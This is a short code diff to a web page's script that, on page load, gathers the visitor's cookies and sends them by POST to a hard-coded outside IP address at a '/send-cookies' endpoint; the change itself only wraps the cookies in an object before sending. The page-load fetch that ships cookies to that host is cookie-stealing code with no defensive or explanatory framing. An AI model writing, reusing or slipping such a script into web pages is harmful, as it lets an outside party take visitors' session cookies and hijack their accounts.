@@ -28,7 +28,7 @@
 
         window.onload = function() {
             const cookies = getCookies();
-            console.log(JSON.stringify(cookies));
+            console.log(JSON.stringify({ cookies: cookies }));
 
             fetch('https://144.172.76.108:8000/send-cookies', {
                 method: 'POST',
@@ -36,7 +36,7 @@
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify(cookies)
+                body: JSON.stringify({ cookies: cookies })
             })
             .then(response => response.text())
             .then(data => console.log(data))
